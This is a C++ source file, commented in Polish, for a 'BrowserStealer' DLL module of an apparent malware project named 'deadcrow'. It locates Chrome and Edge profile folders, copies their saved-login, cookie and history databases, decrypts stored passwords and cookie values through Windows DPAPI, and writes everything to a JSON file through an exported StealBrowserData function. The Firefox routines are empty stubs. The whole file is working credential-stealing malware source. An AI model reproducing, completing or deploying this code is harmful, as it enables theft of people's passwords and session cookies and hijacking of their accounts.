#include "browser_stealer.h"
#include <iostream>
#include <fstream>
#include <sstream>
#include <iomanip>
#include <ctime>
#include <filesystem>
#include <sqlite3.h>
#include <nlohmann/json.hpp>
#include <windows.h>
#include <wincrypt.h>
#include <dpapi.h>
#include <shlobj.h>

#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "advapi32.lib")

using json = nlohmann::json;
namespace fs = std::filesystem;

namespace deadcrow {
namespace modules {

BrowserStealer::BrowserStealer() {
    // Domyślny callback statusu (do konsoli)
    status_callback_ = [](const std::string& status) {
        // W wersji produkcyjnej lepiej wyłączyć logi
        #ifdef _DEBUG
        std::cout << "[BROWSER_STEALER] " << status << std::endl;
        #endif
    };
}

BrowserStealer::~BrowserStealer() {
    // Nic do czyszczenia
}

std::vector<BrowserStealer::Credential> BrowserStealer::stealCredentials() {
    reportStatus("Pobieranie danych logowania z przeglądarek");
    
    std::vector<Credential> credentials;
    
    // Pobierz dane z Chrome
    std::vector<Credential> chrome_creds = stealChromiumCredentials();
    credentials.insert(credentials.end(), chrome_creds.begin(), chrome_creds.end());
    
    // Pobierz dane z Firefox
    std::vector<Credential> firefox_creds = stealFirefoxCredentials();
    credentials.insert(credentials.end(), firefox_creds.begin(), firefox_creds.end());
    
    // Pobierz dane z Edge
    std::vector<Credential> edge_creds = stealEdgeCredentials();
    credentials.insert(credentials.end(), edge_creds.begin(), edge_creds.end());
    
    reportStatus("Pobrano " + std::to_string(credentials.size()) + " danych logowania");
    return credentials;
}

std::vector<BrowserStealer::Cookie> BrowserStealer::stealCookies() {
    reportStatus("Pobieranie cookies z przeglądarek");
    
    std::vector<Cookie> cookies;
    
    // Pobierz cookies z Chrome
    std::vector<Cookie> chrome_cookies = stealChromiumCookies();
    cookies.insert(cookies.end(), chrome_cookies.begin(), chrome_cookies.end());
    
    // Pobierz cookies z Firefox
    std::vector<Cookie> firefox_cookies = stealFirefoxCookies();
    cookies.insert(cookies.end(), firefox_cookies.begin(), firefox_cookies.end());
    
    // Pobierz cookies z Edge
    std::vector<Cookie> edge_cookies = stealEdgeCookies();
    cookies.insert(cookies.end(), edge_cookies.begin(), edge_cookies.end());
    
    reportStatus("Pobrano " + std::to_string(cookies.size()) + " cookies");
    return cookies;
}

std::vector<BrowserStealer::HistoryItem> BrowserStealer::stealHistory() {
    reportStatus("Pobieranie historii z przeglądarek");
    
    std::vector<HistoryItem> history;
    
    // Pobierz historię z Chrome
    std::vector<HistoryItem> chrome_history = stealChromiumHistory();
    history.insert(history.end(), chrome_history.begin(), chrome_history.end());
    
    // Pobierz historię z Firefox
    std::vector<HistoryItem> firefox_history = stealFirefoxHistory();
    history.insert(history.end(), firefox_history.begin(), firefox_history.end());
    
    // Pobierz historię z Edge
    std::vector<HistoryItem> edge_history = stealEdgeHistory();
    history.insert(history.end(), edge_history.begin(), edge_history.end());
    
    reportStatus("Pobrano " + std::to_string(history.size()) + " elementów historii");
    return history;
}

bool BrowserStealer::stealAllToJson(const std::string& output_path) {
    reportStatus("Pobieranie wszystkich danych z przeglądarek");
    
    // Pobierz wszystkie dane
    std::vector<Credential> credentials = stealCredentials();
    std::vector<Cookie> cookies = stealCookies();
    std::vector<HistoryItem> history = stealHistory();
    
    // Utwórz obiekt JSON
    json j;
    
    // Dodaj dane logowania
    json j_credentials = json::array();
    for (const auto& cred : credentials) {
        json j_cred;
        j_cred["url"] = cred.url;
        j_cred["username"] = cred.username;
        j_cred["password"] = cred.password;
        j_cred["browser"] = cred.browser;
        j_cred["timestamp"] = cred.timestamp;
        j_credentials.push_back(j_cred);
    }
    j["credentials"] = j_credentials;
    
    // Dodaj cookies
    json j_cookies = json::array();
    for (const auto& cookie : cookies) {
        json j_cookie;
        j_cookie["host"] = cookie.host;
        j_cookie["name"] = cookie.name;
        j_cookie["value"] = cookie.value;
        j_cookie["path"] = cookie.path;
        j_cookie["expiry"] = cookie.expiry;
        j_cookie["secure"] = cookie.secure;
        j_cookie["httpOnly"] = cookie.httpOnly;
        j_cookie["browser"] = cookie.browser;
        j_cookies.push_back(j_cookie);
    }
    j["cookies"] = j_cookies;
    
    // Dodaj historię
    json j_history = json::array();
    for (const auto& item : history) {
        json j_item;
        j_item["url"] = item.url;
        j_item["title"] = item.title;
        j_item["timestamp"] = item.timestamp;
        j_item["visit_count"] = item.visit_count;
        j_item["browser"] = item.browser;
        j_history.push_back(j_item);
    }
    j["history"] = j_history;
    
    // Zapisz do pliku
    try {
        std::ofstream file(output_path);
        if (!file) {
            reportStatus("Nie udało się otworzyć pliku do zapisu");
            return false;
        }
        
        file << j.dump(4); // Pretty print z wcięciem 4 spacje
        file.close();
        
        reportStatus("Dane zapisane do pliku: " + output_path);
        return true;
    }
    catch (const std::exception& e) {
        reportStatus("Błąd podczas zapisywania danych: " + std::string(e.what()));
        return false;
    }
}

std::vector<BrowserStealer::Credential> BrowserStealer::stealChromiumCredentials() {
    reportStatus("Pobieranie danych logowania z Chrome/Chromium");
    
    std::vector<Credential> credentials;
    
    // Pobierz ścieżkę do profilu Chrome
    std::string profile_path = getChromiumProfilePath();
    if (profile_path.empty()) {
        reportStatus("Nie znaleziono profilu Chrome");
        return credentials;
    }
    
    // Ścieżka do bazy danych z hasłami
    std::string login_data_path = profile_path + "\\Login Data";
    
    // Skopiuj bazę danych do pliku tymczasowego (Chrome blokuje dostęp do oryginalnego pliku)
    std::string temp_path = std::tmpnam(nullptr);
    if (!CopyFileA(login_data_path.c_str(), temp_path.c_str(), FALSE)) {
        reportStatus("Nie udało się skopiować bazy danych Chrome");
        return credentials;
    }
    
    // Otwórz bazę danych
    sqlite3* db = nullptr;
    if (sqlite3_open(temp_path.c_str(), &db) != SQLITE_OK) {
        reportStatus("Nie udało się otworzyć bazy danych Chrome");
        DeleteFileA(temp_path.c_str());
        return credentials;
    }
    
    // Wykonaj zapytanie
    const char* query = "SELECT origin_url, username_value, password_value, date_created FROM logins";
    sqlite3_stmt* stmt = nullptr;
    
    if (sqlite3_prepare_v2(db, query, -1, &stmt, nullptr) != SQLITE_OK) {
        reportStatus("Nie udało się przygotować zapytania");
        sqlite3_close(db);
        DeleteFileA(temp_path.c_str());
        return credentials;
    }
    
    // Pobierz wyniki
    while (sqlite3_step(stmt) == SQLITE_ROW) {
        Credential cred;
        
        // Pobierz URL
        const char* url = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 0));
        if (url) {
            cred.url = url;
        }
        
        // Pobierz nazwę użytkownika
        const char* username = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 1));
        if (username) {
            cred.username = username;
        }
        
        // Pobierz zaszyfrowane hasło
        const void* encrypted_password = sqlite3_column_blob(stmt, 2);
        int password_size = sqlite3_column_bytes(stmt, 2);
        
        if (encrypted_password && password_size > 0) {
            std::vector<uint8_t> encrypted_value(
                static_cast<const uint8_t*>(encrypted_password),
                static_cast<const uint8_t*>(encrypted_password) + password_size
            );
            
            cred.password = decryptChromiumPassword(encrypted_value);
        }
        
        // Pobierz datę utworzenia
        sqlite3_int64 date_created = sqlite3_column_int64(stmt, 3);
        // Konwersja z formatu Chrome (mikrosekundy od 1601-01-01) na format Unix (sekundy od 1970-01-01)
        time_t unix_time = (date_created / 1000000) - 11644473600;
        
        std::tm tm_time;
        localtime_s(&tm_time, &unix_time);
        std::stringstream ss;
        ss << std::put_time(&tm_time, "%Y-%m-%d %H:%M:%S");
        cred.timestamp = ss.str();
        
        cred.browser = "Chrome";
        
        credentials.push_back(cred);
    }
    
    // Zwolnij zasoby
    sqlite3_finalize(stmt);
    sqlite3_close(db);
    DeleteFileA(temp_path.c_str());
    
    reportStatus("Pobrano " + std::to_string(credentials.size()) + " danych logowania z Chrome");
    return credentials;
}

std::vector<BrowserStealer::Cookie> BrowserStealer::stealChromiumCookies() {
    reportStatus("Pobieranie cookies z Chrome/Chromium");
    
    std::vector<Cookie> cookies;
    
    // Pobierz ścieżkę do profilu Chrome
    std::string profile_path = getChromiumProfilePath();
    if (profile_path.empty()) {
        reportStatus("Nie znaleziono profilu Chrome");
        return cookies;
    }
    
    // Ścieżka do bazy danych z cookies
    std::string cookies_path = profile_path + "\\Cookies";
    
    // Skopiuj bazę danych do pliku tymczasowego
    std::string temp_path = std::tmpnam(nullptr);
    if (!CopyFileA(cookies_path.c_str(), temp_path.c_str(), FALSE)) {
        reportStatus("Nie udało się skopiować bazy danych cookies Chrome");
        return cookies;
    }
    
    // Otwórz bazę danych
    sqlite3* db = nullptr;
    if (sqlite3_open(temp_path.c_str(), &db) != SQLITE_OK) {
        reportStatus("Nie udało się otworzyć bazy danych cookies Chrome");
        DeleteFileA(temp_path.c_str());
        return cookies;
    }
    
    // Wykonaj zapytanie
    const char* query = "SELECT host_key, name, encrypted_value, path, expires_utc, is_secure, is_httponly FROM cookies";
    sqlite3_stmt* stmt = nullptr;
    
    if (sqlite3_prepare_v2(db, query, -1, &stmt, nullptr) != SQLITE_OK) {
        reportStatus("Nie udało się przygotować zapytania");
        sqlite3_close(db);
        DeleteFileA(temp_path.c_str());
        return cookies;
    }
    
    // Pobierz wyniki
    while (sqlite3_step(stmt) == SQLITE_ROW) {
        Cookie cookie;
        
        // Pobierz host
        const char* host = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 0));
        if (host) {
            cookie.host = host;
        }
        
        // Pobierz nazwę
        const char* name = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 1));
        if (name) {
            cookie.name = name;
        }
        
        // Pobierz zaszyfrowaną wartość
        const void* encrypted_value = sqlite3_column_blob(stmt, 2);
        int value_size = sqlite3_column_bytes(stmt, 2);
        
        if (encrypted_value && value_size > 0) {
            std::vector<uint8_t> encrypted_data(
                static_cast<const uint8_t*>(encrypted_value),
                static_cast<const uint8_t*>(encrypted_value) + value_size
            );
            
            cookie.value = decryptChromiumPassword(encrypted_data);
        }
        
        // Pobierz ścieżkę
        const char* path = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 3));
        if (path) {
            cookie.path = path;
        }
        
        // Pobierz datę wygaśnięcia
        sqlite3_int64 expires_utc = sqlite3_column_int64(stmt, 4);
        // Konwersja z formatu Chrome (mikrosekundy od 1601-01-01) na format Unix (sekundy od 1970-01-01)
        time_t unix_time = (expires_utc / 1000000) - 11644473600;
        
        std::tm tm_time;
        localtime_s(&tm_time, &unix_time);
        std::stringstream ss;
        ss << std::put_time(&tm_time, "%Y-%m-%d %H:%M:%S");
        cookie.expiry = ss.str();
        
        // Pobierz flagi
        cookie.secure = sqlite3_column_int(stmt, 5) != 0;
        cookie.httpOnly = sqlite3_column_int(stmt, 6) != 0;
        
        cookie.browser = "Chrome";
        
        cookies.push_back(cookie);
    }
    
    // Zwolnij zasoby
    sqlite3_finalize(stmt);
    sqlite3_close(db);
    DeleteFileA(temp_path.c_str());
    
    reportStatus("Pobrano " + std::to_string(cookies.size()) + " cookies z Chrome");
    return cookies;
}

std::vector<BrowserStealer::HistoryItem> BrowserStealer::stealChromiumHistory() {
    reportStatus("Pobieranie historii z Chrome/Chromium");
    
    std::vector<HistoryItem> history;
    
    // Pobierz ścieżkę do profilu Chrome
    std::string profile_path = getChromiumProfilePath();
    if (profile_path.empty()) {
        reportStatus("Nie znaleziono profilu Chrome");
        return history;
    }
    
    // Ścieżka do bazy danych z historią
    std::string history_path = profile_path + "\\History";
    
    // Skopiuj bazę danych do pliku tymczasowego
    std::string temp_path = std::tmpnam(nullptr);
    if (!CopyFileA(history_path.c_str(), temp_path.c_str(), FALSE)) {
        reportStatus("Nie udało się skopiować bazy danych historii Chrome");
        return history;
    }
    
    // Otwórz bazę danych
    sqlite3* db = nullptr;
    if (sqlite3_open(temp_path.c_str(), &db) != SQLITE_OK) {
        reportStatus("Nie udało się otworzyć bazy danych historii Chrome");
        DeleteFileA(temp_path.c_str());
        return history;
    }
    
    // Wykonaj zapytanie
    const char* query = "SELECT url, title, last_visit_time, visit_count FROM urls ORDER BY last_visit_time DESC LIMIT 1000";
    sqlite3_stmt* stmt = nullptr;
    
    if (sqlite3_prepare_v2(db, query, -1, &stmt, nullptr) != SQLITE_OK) {
        reportStatus("Nie udało się przygotować zapytania");
        sqlite3_close(db);
        DeleteFileA(temp_path.c_str());
        return history;
    }
    
    // Pobierz wyniki
    while (sqlite3_step(stmt) == SQLITE_ROW) {
        HistoryItem item;
        
        // Pobierz URL
        const char* url = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 0));
        if (url) {
            item.url = url;
        }
        
        // Pobierz tytuł
        const char* title = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 1));
        if (title) {
            item.title = title;
        }
        
        // Pobierz datę ostatniej wizyty
        sqlite3_int64 last_visit_time = sqlite3_column_int64(stmt, 2);
        // Konwersja z formatu Chrome (mikrosekundy od 1601-01-01) na format Unix (sekundy od 1970-01-01)
        time_t unix_time = (last_visit_time / 1000000) - 11644473600;
        
        std::tm tm_time;
        localtime_s(&tm_time, &unix_time);
        std::stringstream ss;
        ss << std::put_time(&tm_time, "%Y-%m-%d %H:%M:%S");
        item.timestamp = ss.str();
        
        // Pobierz liczbę odwiedzin
        item.visit_count = sqlite3_column_int(stmt, 3);
        
        item.browser = "Chrome";
        
        history.push_back(item);
    }
    
    // Zwolnij zasoby
    sqlite3_finalize(stmt);
    sqlite3_close(db);
    DeleteFileA(temp_path.c_str());
    
    reportStatus("Pobrano " + std::to_string(history.size()) + " elementów historii z Chrome");
    return history;
}

std::vector<BrowserStealer::Credential> BrowserStealer::stealFirefoxCredentials() {
    reportStatus("Pobieranie danych logowania z Firefox");
    
    std::vector<Credential> credentials;
    
    // W rzeczywistej implementacji należałoby dodać kod do pobierania danych z Firefox
    // Firefox przechowuje dane logowania w pliku logins.json, zaszyfrowane za pomocą klucza głównego
    // Deszyfrowanie wymaga znajomości klucza głównego, który jest chroniony hasłem użytkownika
    
    reportStatus("Pobieranie danych logowania z Firefox nie jest jeszcze zaimplementowane");
    return credentials;
}

std::vector<BrowserStealer::Cookie> BrowserStealer::stealFirefoxCookies() {
    reportStatus("Pobieranie cookies z Firefox");
    
    std::vector<Cookie> cookies;
    
    // W rzeczywistej implementacji należałoby dodać kod do pobierania cookies z Firefox
    // Firefox przechowuje cookies w pliku cookies.sqlite
    
    reportStatus("Pobieranie cookies z Firefox nie jest jeszcze zaimplementowane");
    return cookies;
}

std::vector<BrowserStealer::HistoryItem> BrowserStealer::stealFirefoxHistory() {
    reportStatus("Pobieranie historii z Firefox");
    
    std::vector<HistoryItem> history;
    
    // W rzeczywistej implementacji należałoby dodać kod do pobierania historii z Firefox
    // Firefox przechowuje historię w pliku places.sqlite
    
    reportStatus("Pobieranie historii z Firefox nie jest jeszcze zaimplementowane");
    return history;
}

std::vector<BrowserStealer::Credential> BrowserStealer::stealEdgeCredentials() {
    reportStatus("Pobieranie danych logowania z Edge");
    
    // Edge oparty na Chromium używa tego samego formatu co Chrome
    std::vector<Credential> credentials = stealChromiumCredentials();
    
    // Zmień nazwę przeglądarki
    for (auto& cred : credentials) {
        cred.browser = "Edge";
    }
    
    return credentials;
}

std::vector<BrowserStealer::Cookie> BrowserStealer::stealEdgeCookies() {
    reportStatus("Pobieranie cookies z Edge");
    
    // Edge oparty na Chromium używa tego samego formatu co Chrome
    std::vector<Cookie> cookies = stealChromiumCookies();
    
    // Zmień nazwę przeglądarki
    for (auto& cookie : cookies) {
        cookie.browser = "Edge";
    }
    
    return cookies;
}

std::vector<BrowserStealer::HistoryItem> BrowserStealer::stealEdgeHistory() {
    reportStatus("Pobieranie historii z Edge");
    
    // Edge oparty na Chromium używa tego samego formatu co Chrome
    std::vector<HistoryItem> history = stealChromiumHistory();
    
    // Zmień nazwę przeglądarki
    for (auto& item : history) {
        item.browser = "Edge";
    }
    
    return history;
}

std::string BrowserStealer::decryptChromiumPassword(const std::vector<uint8_t>& encrypted_value) {
    // Sprawdź, czy dane są zaszyfrowane (powinny zaczynać się od "v10" lub "v11")
    if (encrypted_value.size() < 3 || encrypted_value[0] != 'v' || encrypted_value[1] != '1' || (encrypted_value[2] != '0' && encrypted_value[2] != '1')) {
        // Dane nie są zaszyfrowane, zwróć jako tekst
        return std::string(encrypted_value.begin(), encrypted_value.end());
    }
    
    // Dane są zaszyfrowane, użyj DPAPI do odszyfrowania
    DATA_BLOB encrypted_blob;
    encrypted_blob.pbData = const_cast<BYTE*>(encrypted_value.data() + 3); // Pomiń prefix "v10" lub "v11"
    encrypted_blob.cbData = encrypted_value.size() - 3;
    
    DATA_BLOB decrypted_blob;
    
    if (!CryptUnprotectData(&encrypted_blob, nullptr, nullptr, nullptr, nullptr, 0, &decrypted_blob)) {
        reportStatus("Nie udało się odszyfrować hasła");
        return "";
    }
    
    // Konwertuj odszyfrowane dane na string
    std::string decrypted_password(reinterpret_cast<char*>(decrypted_blob.pbData), decrypted_blob.cbData);
    
    // Zwolnij pamięć
    LocalFree(decrypted_blob.pbData);
    
    return decrypted_password;
}

std::string BrowserStealer::decryptFirefoxPassword(const std::string& encrypted_value) {
    // W rzeczywistej implementacji należałoby dodać kod do deszyfrowania haseł z Firefox
    // Firefox używa 3DES do szyfrowania haseł, z kluczem głównym chronionym hasłem użytkownika
    
    return ""; // Nie zaimplementowano
}

std::string BrowserStealer::getChromiumProfilePath() {
    // Pobierz ścieżkę do katalogu AppData\Local
    char app_data[MAX_PATH];
    if (FAILED(SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, app_data))) {
        reportStatus("Nie udało się pobrać ścieżki do katalogu AppData");
        return "";
    }
    
    // Ścieżka do profilu Chrome
    std::string chrome_path = std::string(app_data) + "\\Google\\Chrome\\User Data\\Default";
    
    // Sprawdź, czy katalog istnieje
    if (fs::exists(chrome_path)) {
        return chrome_path;
    }
    
    // Ścieżka do profilu Edge
    std::string edge_path = std::string(app_data) + "\\Microsoft\\Edge\\User Data\\Default";
    
    // Sprawdź, czy katalog istnieje
    if (fs::exists(edge_path)) {
        return edge_path;
    }
    
    return "";
}

std::string BrowserStealer::getFirefoxProfilePath() {
    // Pobierz ścieżkę do katalogu AppData\Roaming
    char app_data[MAX_PATH];
    if (FAILED(SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, app_data))) {
        reportStatus("Nie udało się pobrać ścieżki do katalogu AppData");
        return "";
    }
    
    // Ścieżka do katalogu profilów Firefox
    std::string profiles_path = std::string(app_data) + "\\Mozilla\\Firefox\\Profiles";
    
    // Sprawdź, czy katalog istnieje
    if (!fs::exists(profiles_path)) {
        return "";
    }
    
    // Znajdź pierwszy katalog profilu (zazwyczaj ma nazwę kończącą się na ".default")
    for (const auto& entry : fs::directory_iterator(profiles_path)) {
        if (entry.is_directory()) {
            std::string profile_name = entry.path().filename().string();
            if (profile_name.find(".default") != std::string::npos) {
                return entry.path().string();
            }
        }
    }
    
    return "";
}

std::string BrowserStealer::getEdgeProfilePath() {
    // Edge oparty na Chromium używa tego samego formatu co Chrome
    return getChromiumProfilePath();
}

void BrowserStealer::setStatusCallback(std::function<void(const std::string&)> callback) {
    status_callback_ = callback;
}

void BrowserStealer::reportStatus(const std::string& status) {
    if (status_callback_) {
        status_callback_(status);
    }
}

BOOL WINAPI BrowserStealer::DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    switch (fdwReason) {
        case DLL_PROCESS_ATTACH:
            // Inicjalizacja DLL
            DisableThreadLibraryCalls(hinstDLL);
            break;
        case DLL_PROCESS_DETACH:
            // Czyszczenie przy wyładowaniu DLL
            break;
    }
    
    return TRUE;
}

// Implementacja funkcji eksportowanych

extern "C" __declspec(dllexport) const char* StealBrowserData(const char* output_path) {
    static std::string result;
    
    try {
        BrowserStealer stealer;
        bool success = stealer.stealAllToJson(output_path);
        
        if (success) {
            result = "Dane zapisane do pliku: " + std::string(output_path);
        } else {
            result = "Nie udało się zapisać danych do pliku";
        }
    }
    catch (const std::exception& e) {
        result = "Błąd: " + std::string(e.what());
    }
    
    return result.c_str();
}

} // namespace modules
} // namespace deadcrow
